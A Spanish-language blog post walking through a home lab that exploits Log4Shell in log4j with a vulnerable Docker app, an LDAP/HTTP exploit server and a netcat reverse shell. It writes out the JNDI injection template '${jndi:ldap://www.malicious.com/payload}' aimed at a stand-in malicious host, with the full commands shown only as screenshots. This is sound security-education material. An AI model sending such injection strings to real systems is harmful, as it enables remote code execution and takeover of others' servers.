I"`<h2 id="explicación-teórica">Explicación teórica</h2>

<p>En esta ocasión vamos a realizar una práctica de laboratorio sencilla donde explotaremos la en su día ya famosa vulnerabilidad <code class="language-plaintext highlighter-rouge">Log4shell</code>. Esta vulnerabilidad es del tipo RCE (Ejecución Remota de código), con una gran criticidad y fue en su momento un 0day en el popular paquete de logging <code class="language-plaintext highlighter-rouge">log4j</code>.</p>

<p>Algunos detalles más técnicos de la vulnerabilidad pueden leerse <a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">aquí</a></p>

<p>A partir de esta vulnerabilidad y su correspondiente parche, se fueron desencadenado nuevas vulnerabilidades. La <a href="https://blog.aquasec.com/log4j-vulnerabilities-overview">siguiente</a> imagen muestra la línea de acontecimientos:</p>

<p><img src="../img/log4j/key-log4j-events-timeline.jpg" alt="" /></p>

<h2 id="cuál-es-el-problema-que-genera-la-vulnerabilidad">¿Cuál es el problema que genera la vulnerabilidad?</h2>

<p>El meollo de esta vulnerabilidad está contado bastante bien <a href="https://www.akamai.com/es/blog/security/a-log4j-retrospective">aquí</a> y <a href="https://infosecwriteups.com/log4j-zero-day-vulnerability-exploitation-detection-mitigation-9667908857b4">aquí</a>.</p>

<p>A muy grandes rasgos, log4j permite registrar expresiones en los logs que contengan variables, de tal forma que al loggearse la información, log4j interpreta la expresión y sustituye las variables adecuadamente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"${date:MM-dd-yyyy} Access granted" 
</code></pre></div></div>

<p>Además, log4j permite anidar expresiones de búsquedas unas dentro de otras.</p>

<h3 id="jndi-java-naming-and-directory-interface">JNDI (Java Naming and Directory Interface)</h3>

<p>Esta funcionalidad de log4j permite a una aplicación obtener datos de un servidor remoto utilizando protocolos tales como LDAP o RMI.</p>

<p>Todo esta teoría junta, puede usarse para explotar la vulnerabilidad de la siguiente forma:</p>

<p><img src="../img/log4j/00.jpg" alt="" /></p>

<p>Es decir, muy resumidas, ocurren las siguiente cosas:</p>

<ol>
  <li>
    <p>Un atacante realiza una petición a la aplicación vulnerable y “cuela” una cadena JNDI para ser loggeada por log4j (en una cabecera HTTP por ejemplo)
 Esta cadena contiene una petición de búsqueda a un servidor LDAP malicioso.</p>
  </li>
  <li>
    <p>Esta petición o cadena es, efectivamente, loggeada por log4j, que la interpreta y contacta con el servidor LDAP malicioso</p>
  </li>
  <li>
    <p>El servidor LDAP malicioso responde con una clase Java maliciosa</p>
  </li>
  <li>
    <p>El servidor víctima deserializa o descarga la clase Java malicoso y la ejecuta</p>
  </li>
</ol>

<h2 id="caso-práctico">Caso práctico</h2>

<p>Para este escenario me he basado es una explicación genial de un buen <a href="https://ciberseguridad.blog/como-explotar-la-vulnerabilidad-log4shell-en-nuestro-laboratorio/ ¡">blog</a> en español y me parece importante darle su crédito.</p>

<p>Vamos a utilizar dos máquinas virtuales:</p>

<ul>
  <li>
    <p>En la primera ejecutaremos una aplicación vulnerable a <code class="language-plaintext highlighter-rouge">log4shell</code>. Se tratará de <a href="https://github.com/christophetd/log4shell-vulnerable-app">este</a> contenedor Docker. Utilizaré un Lubuntu que tenía a mano.</p>
  </li>
  <li>
    <p>En la segunda ejecutaremos un <a href="https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2">exploit</a> diseñado para esta vulnerabilidad, que levantará un servidor LDAP (para recibir la petición de la víctima) y otro HTTP (para servir el exploit).</p>

    <p>También pondremos un netcat a escuchar, ya que el exploit establecerá una shell reversa.</p>

    <p>Y desde este servidor será desde realizaremos la petición maliciosa a la víctima, mediante <code class="language-plaintext highlighter-rouge">curl</code>, construida adecuadamente para explotar la vulnerabilidad descrita.</p>

    <p>Utilizaré una Debian que también tenía a mano.</p>
  </li>
</ul>

<p>En esencia, la cosa quedaría así:</p>

<p><img src="../img/log4j/diagrama.png" alt="" /></p>

<p>Así pues, vayamos al lío. Ejecutamos la aplicación vulnerablen en el Lubuntu:</p>

<p><img src="../img/log4j/1.png" alt="" /></p>

<p>Ejecutamos el exploit en la Debian. Comprobamos como se inician el servidor LDAP (puerto 1389) y el HTTP (el 8888 le hemos indicado):</p>

<p><img src="../img/log4j/2.png" alt="" /></p>

<p>Y ponemos en esta misma máquina netcat a la escucha para recibir la reverse shell:</p>

<p><img src="../img/log4j/3.png" alt="" /></p>

<p>La petición CURL que vamos a realizar, será del tipo <code class="language-plaintext highlighter-rouge">${jndi:ldap://www.malicious.com/payload}</code>, donde <code class="language-plaintext highlighter-rouge">www.malicious.com</code> es el servidor LDAP malicioso y <code class="language-plaintext highlighter-rouge">payload</code> será la orden a ejecutar para conseguir la reverse shell, codificada en base64.</p>

<p>El <code class="language-plaintext highlighter-rouge">payload</code>:</p>

<p><img src="../img/log4j/4.png" alt="" /></p>

<p>La petición CURL completa:</p>

<p><img src="../img/log4j/5.png" alt="" /></p>

<p>El servidor con la aplicación vulnerable recibiendo la petición:</p>

<p><img src="../img/log4j/6.png" alt="" /></p>

<p><img src="../img/log4j/7.png" alt="" /></p>

<p>Nuestros servidores maliciosos en la máquina DEbian recibiendo sus respectivas peticiones LDAP y HTTP sirviendo la clase Java maliciosa:</p>

<p><img src="../img/log4j/8.png" alt="" /></p>

<p>Y tras este intercambio de peticiones y respuestas, obtenemos nuestra shell inversa:</p>

<p><img src="../img/log4j/9.png" alt="" /></p>

:ET